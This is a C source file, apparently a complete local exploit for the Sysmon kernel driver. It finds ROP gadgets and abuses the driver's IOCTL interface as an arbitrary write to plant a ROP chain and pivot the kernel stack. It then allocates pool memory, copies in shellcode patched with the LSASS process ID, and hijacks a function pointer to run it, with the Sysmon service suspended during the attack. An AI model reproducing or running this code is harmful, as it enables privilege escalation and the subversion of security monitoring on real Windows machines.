	BYTE MovRaxRaxPattern[] = { 0x48, 0x8B, 0x00, 0xC3 };
	BYTE MovRaxRax18Pattern[] = { 0x48, 0x8B, 0x40, 0x18, 0xC3 };
	BYTE AddRax8Pattern[] = { 0x48, 0x83, 0xC0, 0x08, 0xC3 };

	SysmonBase = GetDriverBase(L"SysmonDrv.sys");
	SysmonTarget = (PVOID)((ULONG_PTR)SysmonBase + SYSMON_END_OF_DATA_SECTION_OFFSET - sizeof(PVOID));
	SysmonEventList = (PVOID)((ULONG_PTR)SysmonBase + SYSMON_REPORT_EVENT_LIST_OFFSET);
	StackReturnAddress = (PBYTE)StackAddress - 0x58;
	//
	// Original return location.
	//
	SysmonRestore = (PVOID)((ULONG_PTR)SysmonBase + SYSMON_RETURN_FROM_QUEUEEVENT_OFFSET);

	//
	// Should probably move this to the beginning of program execution
	// to avoid doing it again if reading the pool fails.
	//
	GET_ROP_GADGET(StackPivot);
	GET_ROP_GADGET(PopRax);
	GET_ROP_GADGET(MovRdxRax);
	GET_ROP_GADGET(PopRdx);
	GET_ROP_GADGET(PopRcx);
	GET_ROP_GADGET(PopR8);
	GET_ROP_GADGET(AddRsp25);
	GET_ROP_GADGET(MovRaxRax);
	GET_ROP_GADGET(MovRaxRax18);
	GET_ROP_GADGET(AddRax8);

	GET_NT_PROC(ExAllocatePoolWithTag);

	//
	// Write ROP chain into SysmonDrv data section.
	//
	PRINT_INFO("Writing ROP chain...\n");

	//
	// Restore code execution.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&StackReturnAddress, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&StackPivotGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&MovRdxRaxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&StackReturnAddress, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRdxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&SysmonRestore, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRaxGadget, sizeof(PVOID));

	//
	// Copy the pool into the first event in the queue.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&MovRdxRaxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	//
	// Store location of EVENT_REPORT.EventData's first member.
	//
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRdxGadget, sizeof(PVOID));
	//
	// Store pool here.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRaxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&MovRdxRaxGadget, sizeof(PVOID));
	//
	// Location to store EVENT_REPORT.EventData's first member, as above.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	PVOID Temp = (PBYTE)SysmonTarget + 5 * sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Temp, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRdxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&AddRax8Gadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&MovRaxRax18Gadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&MovRaxRaxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&SysmonEventList, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRaxGadget, sizeof(PVOID));

	//
	// Copy pool to EventData.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&MovRdxRaxGadget, sizeof(PVOID));
	//
	// EventData + 0x18.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	Temp = (PBYTE)SysmonTarget + 11 * sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Temp, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRdxGadget, sizeof(PVOID));

	//
	// Shadow stack for ExAllocatePoolWithTag.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	//
	// ExAllocatePoolWithTag.
	//
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&AddRsp25Gadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&ExAllocatePoolWithTag, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&Zero, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopR8Gadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&DataSize, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRdxGadget, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PoolType, sizeof(PVOID));
	(PBYTE)SysmonTarget -= sizeof(PVOID);
	WritePrimitive(Device, SysmonTarget, (PBYTE)&PopRcxGadget, sizeof(PVOID));

	//
	// Write stack pivot into stack.
	// ret -0x58 from RSP.
	//
	PRINT_INFO("Writing stack pivot...\n");
	WritePrimitive(Device, StackReturnAddress, (PBYTE)&StackPivotGadget, sizeof(PVOID));
	WritePrimitive(Device, (PBYTE)StackReturnAddress + sizeof(PVOID), (PBYTE)&SysmonTarget, sizeof(PVOID));

	ExecuteRop(Device);

	//
	// Read event.
	//
	PRINT_INFO("Attempting to read pool...\n");
	while (TRUE) {
		EventData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_EVENT_SIZE);
		if (!EventData) {
			printf("HeapAlloc EventData failed: %u\n", GetLastError());
			break;
		}

		//
		// Read events.
		//
		Success = DeviceIoControl(
			Device,
			0x83400004,
			NULL,
			0,
			EventData,
			MAX_EVENT_SIZE,
			&BytesReturned,
			NULL
		);
		if (Success) {
			//
			// Check for file delete.
			//
			if (((PEVENT_HEADER)EventData)->Unk1) {
				Pool = ((PEVENT_HEADER)EventData)->Unk1;
				PRINT_SUCCESS("Found pool: %p\n", Pool);
				HeapFree(GetProcessHeap(), 0, EventData);
				return Pool;
			} else {
				HeapFree(GetProcessHeap(), 0, EventData);
				break;
			}
		}

		HeapFree(GetProcessHeap(), 0, EventData);
	}

	return NULL;
}

BOOL
DoExploit(
	_In_ HANDLE Device,
	//_Inout_opt_ PSET_ARCHIVED_INFO ArchivedInfo,
	_In_ PBYTE Data,
	_In_ SIZE_T DataSize
)
{
	PVOID Pool = NULL;
	PVOID SysmonZwOpenProcessTokenEx = NULL;
	PSET_ARCHIVED_INFO ArchivedInfo;

	//
	// Returns valid Event and stack address.
	//
	while (!Pool) {
		ZeroMemory(&ArchivedInfo, sizeof(SET_ARCHIVED_INFO));
		PRINT_INFO("Getting archive info...\n");

		if (!GetArchiveInfo(Device, &ArchivedInfo)) {
			PRINT_ERROR("GetArchiveInfo failed.\n");
			return FALSE;
		}

		g_ServiceProcessHandle = ArchivedInfo->ServiceProcessHandle;
		g_ValidEvent = ArchivedInfo->Event;
		g_ValidStack = ArchivedInfo->IsArchivedAddress;

		g_EventBypassAddr = GetNtPattern(g_EventBypassPattern, sizeof(g_EventBypassPattern));

		PRINT_INFO("Attempting to allocate pool.\n");
		Pool = GetPool(Device, ArchivedInfo->IsArchivedAddress, DataSize);
		if (!Pool) {
			PRINT_ERROR("Failed to find pool. Retrying...\n");
			Sleep(10000);
			//return FALSE;
		}
	}

	PRINT_INFO("Writing data to pool @ %p...\n", Pool);
	WritePrimitive(Device, Pool, Data, DataSize);

	SysmonZwOpenProcessTokenEx = (PVOID)((ULONG_PTR)GetDriverBase(L"SysmonDrv.sys") + SYSMON_ZWOPENPROCESSTOKENEX_OFFSET);
	PRINT_INFO("Writing pool to %p and executing...\n", SysmonZwOpenProcessTokenEx);
	WritePrimitive(Device, SysmonZwOpenProcessTokenEx, (PBYTE)&Pool, sizeof(PVOID));

	if (ArchivedInfo) {
		HeapFree(GetProcessHeap(), 0, ArchivedInfo);
	}

	return TRUE;
}

int
main(
	_In_ int argc,
	_In_ char *argv[]
)
{
	HANDLE Device = NULL;
	BOOL Success;
	BOOL ServiceSuspended = FALSE;
	ULONG Error = ERROR_SUCCESS;
	DWORD OutputBuffer = 0;
	DWORD BytesReturned;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WCHAR ProcessName[MAX_PATH * 2];
	WCHAR CommandLine[MAX_PATH * 2];

	if (argc > 1) {
		if (!_stricmp(argv[1], "-g")) {
			GenerateEvents();

			return 0;
		}
	}

	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);

	GetModuleFileName(NULL, ProcessName, ARRAYSIZE(ProcessName));
	GetModuleFileName(NULL, CommandLine, ARRAYSIZE(CommandLine));

	wcscat_s(CommandLine, sizeof(CommandLine) / sizeof(WCHAR), L" -g");

	PRINT_INFO("Creating process to generate events.\n");
	Success = CreateProcess(
		ProcessName,
		CommandLine,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	if (!Success) {
		PRINT_WARNING("CreateProcess failed: %u\n", GetLastError());
	}

	GET_NT_PROC(ZwOpenProcessTokenEx);

	*(PULONG)(&g_Shellcode[3]) = GetLsaPid();
	*(PVOID*)(&g_Shellcode[54]) = ZwOpenProcessTokenEx;
	*(PVOID*)(&g_Shellcode[64]) = (PVOID)((ULONG_PTR)GetDriverBase(L"SysmonDrv.sys") + SYSMON_ZWOPENPROCESSTOKENEX_OFFSET);
	
	PRINT_INFO("Setting debug privileges.\n");
	if (ProcessSetPrivilege(GetCurrentProcess())) {
		PRINT_ERROR("ProcessSetPrivilege failed: %u\n", GetLastError());
		goto end;
	}

	if (!SuspendSysmonService(TRUE)) {
		PRINT_ERROR("Failed to suspend Sysmon.\n");
		goto end;
	}
	ServiceSuspended = TRUE;

	PRINT_INFO("Connecting to SysmonDrv device.\n");
	Device = CreateFile(
		L"\\\\.\\SysmonDrv",
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (Device == INVALID_HANDLE_VALUE) {
		printf("CreateFile failed: %u\n", GetLastError());
		goto end;
	}

	PRINT_INFO("Registering process.\n");
	Success = DeviceIoControl(
		Device,
		0x83400000,
		NULL,
		0,
		&OutputBuffer,
		sizeof(OutputBuffer),
		&BytesReturned,
		NULL
	);
	if (!Success) {
		PRINT_ERROR("DeviceIoControl register process failed: %u\n", GetLastError());
		goto end;
	}

	PRINT_INFO("DeviceIoControl returned: %u (size: %u)\n", OutputBuffer, BytesReturned);

	PRINT_INFO("Setting up exploit...\n");
	//
	// Remove all queued entries.
	//
	PRINT_INFO("Removing all currently queued events...\n");
	RemoveEntries(Device);

	//
	// Get padding of SysmonDrv's .data section.
	//
	PRINT_INFO("Exploiting...\n");
	if (!DoExploit(Device, g_Shellcode, sizeof(g_Shellcode))) {
		PRINT_ERROR("Exploit failed.\n");
		goto end;
	}

	PRINT_SUCCESS("Exploit success!\n");

end:
	if (ServiceSuspended) {
		SuspendSysmonService(FALSE);
	}

	PRINT_INFO("Done.\n");

	if (pi.hProcess) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);

		if (pi.hThread) {
			CloseHandle(pi.hThread);
		}

	}

	if (Device) {
		CloseHandle(Device);
	}

	return 0;
}